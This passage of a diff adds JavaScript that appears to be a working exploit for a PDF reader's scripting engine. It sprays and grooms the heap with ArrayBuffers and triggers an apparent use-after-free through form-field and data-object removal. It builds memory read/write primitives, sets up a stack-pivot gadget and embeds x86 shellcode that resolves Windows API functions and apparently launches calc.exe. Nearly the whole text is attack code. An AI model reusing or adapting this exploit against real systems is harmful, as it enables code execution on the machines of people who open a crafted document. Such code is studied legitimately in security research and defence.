+                fake_arr[j] = new ArrayBuffer(0x1000);
+            }
+            read_array = new Uint32Array(0x100);
+            fake_arr[1] = read_array;
+            break;
+        }
+    }
+
+    if (bChged) {
+        jj();
+        ii();
+        hh();
+        c();
+        var textRVA = gg();
+        var opCodes = new Uint8Array([0x94, 0xC3]);
+        var opCodeAddr = ff(textRVA[0], textRVA[1], opCodes);
+        var funcAddr = ee(textRVA[2], textRVA[3], dllName, funcName);
+
+        var frontvftable = kk(addr - 4);
+
+        var shellcdeaddr = kk(base_addr + 0x18);
+        shellcdeaddr = kk(shellcdeaddr + 0xc);
+
+        var expArrbuf = new DataView(base_mem, 0x8000, 0x1100);
+        for (i = 0; i < 0x300; i++) {
+            expArrbuf.setUint32(i * 4, kk(xfuncaddr + i * 4), true);
+        }
+        expArrbuf.setUint32(9 * 4, opCodeAddr, true);
+
+        expArrbuf.setUint32(0, funcAddr, true);
+        expArrbuf.setUint32(4, shellcdeaddr, true);
+        expArrbuf.setUint32(0x8, shellcdeaddr, true);
+        expArrbuf.setUint32(0xC, 0x1000, true);
+        expArrbuf.setUint32(0x10, 0x40, true);
+        expArrbuf.setUint32(0x14, 0x30303020, true);
+
+        expArrbuf.setUint32(0x1000, xaddr, true);
+        expArrbuf.setUint32(0x1004, xfuncaddr, true);
+
+        dd();
+
+        a.saveXML('pretty');
+
+    }
+
+    var dv2 = new DataView(mem_arr[fakeIdx - 1]);
+
+    for (k = 0; k < 8; k++) {
+        var old = dv2.getUint8(k * 4 + 3);
+        old = (old << 8) + dv2.getUint8(k * 4 + 2);
+        old = (old << 8) + dv2.getUint8(k * 4 + 1);
+        old = (old << 8) + dv2.getUint8(k * 4);
+        dv2.setUint32((3062 + k) * 4, old, true);
+    }
+}
+
+function a() {
+
+
+    for (var i = 0; i < 0x80; i++) {
+        field_arr[i] = this.addField("Field_" + i, "text", 0, [0, 800, 55, 850]);
+    }
+    for (var i = 0; i < 0x80; i++) {
+        this.removeField("Field_" + i);
+    }
+
+    for (var i = 0; i < 0x300; i++) {
+        buf_arr[i] = unescape("%u9584%u9584%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9640%u9648%u9648%u9648%u9648");
+        if (i == 0x250) this.dataObjects[0].toString();
+    }
+
+    for (var i = 0; i < 0x300; i++) {
+        delete buf_arr[i];
+        buf_arr[i] = null;
+    }
+    this.dataObjects[0] = null;
+    g_timeout = app.setTimeOut("b();", 10000);
+}
+
+for (var i = 0; i < 0x1000; i++) {
+    mem_arr1[i] = new ArrayBuffer(0x100);
+    var dv1 = new DataView(mem_arr1[i]);
+    dv1.setUint32(0, 0x41424241, true);
+    dv1.setUint32(4, 0xffffff81, true);
+}
+for (var i = 0; i < 0x3000; i++) {
+    mem_arr[i] = new ArrayBuffer(0xffe8);
+    var dv = new DataView(mem_arr[i]);
+    dv.setUint32(0, 0x41424241, true);
+    dv.setUint32(4, 0xffffff81, true);
+    dv.setUint32(0x2FD8, 0x30303060, true);
+    dv.setUint32(0x2FD8 + 4, 0x30303100, true);
+    dv.setUint32(0x2FD8 + 0xC, 0x30303830, true);
+    dv.setUint32(0x2FD8 + 0x24, 0x10000, true);
+
+    dv.setUint32(0x2FD8 + 0x30, 0x30303090, true);
+
+    dv.setUint32(0x2FD8 + 0x60, 0x303030C0, true);
+    dv.setUint32(0x2FD8 + 0x6C, 0x30303200, true);
+    dv.setUint32(0x2FD8 + 0x70, 0x1000, true);
+
+    dv.setUint32(0x2FD8 + 0x1E9, 1, true);
+
+    dv.setUint32(0x2FD8 + 0xD0, 0x30303130, true);
+
+    dv.setUint32(0x2FD8 + 0x800 - 0xC, 0x10000, true);
+    dv.setUint32(0x2FD8 + 0x800 - 0x8, 8, true);
+    dv.setUint32(0x2FD8 + 0x800 - 0x4, 0x10000, true);
+
+}
+var shellbuf = new ArrayBuffer(0x25000);
+
+var dvshell = new DataView(shellbuf);
+
+var dvshellbuf = new Uint32Array([0xEC8B5560, 0x000017E8, 0x8B615D00, 0x0CE883C5, 0x9058B894, 0x088B3031, 0x8904408B, 0x2460FF01, 0x83EC8B55, 0x565310EC, 0xEB5DEB57, 0x6C61635B, 0x78652E63, 0x55600065, 0x2C246C8B, 0x8B3C458B, 0x03780554, 0x184A8BD5, 0x03205A8B, 0x348B49DD, 0x33F5038B, 0xFCC033FF, 0x74C084AC, 0x0DCFC107, 0xF4EBF803, 0x28247C3B, 0x5A8BE375, 0x66DD0324, 0x8B4B0C8B, 0xDD031C5A, 0x038B048B, 0x45895DC5, 0x458B61F4, 0x0008C2F4, 0x81EC8B55, 0x001000EC, 0x0000E800, 0x835F0000, 0x06EB38C7, 0x05EA835A, 0xF5E805EB, 0x8DFFFFFF, 0xAB10F905, 0x89D02B00, 0x058DF855, 0x00AB108D, 0x89F84503, 0xC933F045, 0xA164C033, 0x00000030, 0x8B0C408B, 0x368B1C70, 0x8B08568B, 0x3966207E, 0xF275184F, 0x746B3F80, 0x4B3F8007, 0xE6EB0274, 0x330C7F80, 0x5589E075, 0xFC5D8BFC, 0x53FC5D8B, 0x8AFE9868, 0xF055FF0E, 0x1084058D, 0x450300AB, 0x50006AF8, 0x81F455FF, 0x001000C4, 0x5E5F5D00, 0x5DE58B5B, 0x909090C3]);
+
+for (var i = 0; i < dvshellbuf.length; i++) {
+    dvshell.setUint32(i * 4, dvshellbuf[i], true);
+}
+
+g_timeout = app.setTimeOut("a();", 3500);
+
